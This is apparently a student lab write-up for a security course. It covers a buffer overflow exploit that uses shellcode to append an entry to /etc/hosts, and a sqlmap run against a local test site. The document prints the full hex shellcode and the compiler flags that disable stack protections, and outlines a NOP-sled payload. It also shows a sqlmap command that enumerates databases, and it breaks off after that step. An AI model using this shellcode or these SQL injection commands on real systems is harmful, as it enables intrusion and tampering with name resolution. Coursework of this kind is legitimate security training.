# Lab #1,20110370, Phung Huy Hoang, INSE331280E_02FIE
# Task 1: Buffer overflow attack
This Lab aims to exploit a buffer overflow vulnerability to attack and modify the /etc/hosts file
**Question 1**: 
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is  added to the /etc/hosts file on your linux. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**:
## 1. Compile asm program and C program to executable code.:
*First, Create a text file named `Lab1.c` containing the vulnerable c code:*<br>

<img width="500" alt="Screenshot" src="https://github.com/hoangphung123/SECLAB1/blob/master/img/Lab1.png?raw=true"><br>

*Then: Compile the vulnerable C program using the following command "gcc -g Lab1.c -o Lab1.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2"*<br>

```sh
gcc -g Lab1.c -o Lab1.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
``` 
- fno-stack-protector: Disables stack protection mechanisms (canary)
- z execstack: Makes the stack executable, allowing the shellcode to run
- mpreferred-stack-boundary=2: Stack will be aligned with 2^2 = 4 bytes

*Next, Write and compile shellcode using assembly*<br>
- Create a file named `shellcode.asm`
- Compile shellcode.asm
```sh
nasm -f elf32 -o shellcode.o shellcode.asm
``` 
```sh
ld -o shellcode shellcode.o
``` 
- The command ld -o shellcode shellcode.o is used to link (link) the object file (object file) shellcode.o into an executable file named shellcode.

*Next, Extract shellcode in hex format*<br>

```sh
for i in $(objdump -d shellcode |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
``` 
- We will get the hex code as shown

<img width="1000" alt="Screenshot" src="https://github.com/hoangphung123/SECLAB1/blob/master/img/Hex.png?raw=true"><br>

```sh
\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d
``` 
*Next, Create Payload*<br>
We will create a payload to overflow the buffer and inject shellcode. Payload includes:
- NOP sled (NOP command sequence to ensure safe jumping into shellcode).
- Shellcode (the code we just extracted).
- Buffer address (memory address containing shellcode).


# Task 2: SQLMAP
- Start docker container from SQLi. 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.
*Step1, Run the following command to download sqlmap from GitHub:*<br>
```sh
git clone https://github.com/sqlmapproject/sqlmap.git
``` 
*Step2, Go into the sqlmap folder:*<br>
```sh
cd sqlmap
``` 
*Step3, Run sqlmap*<br>
```sh
python sqlmap.py
``` 
<img width="1000" alt="Screenshot" src="https://github.com/hoangphung123/SECLAB1/blob/master/img/SQLmap.png?raw=true"><br>

Question 1: Use sqlmap to get information about all available databases Answer 1:
- First we run the following command to find out the database name
```sh
python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1" --dbs
``` 

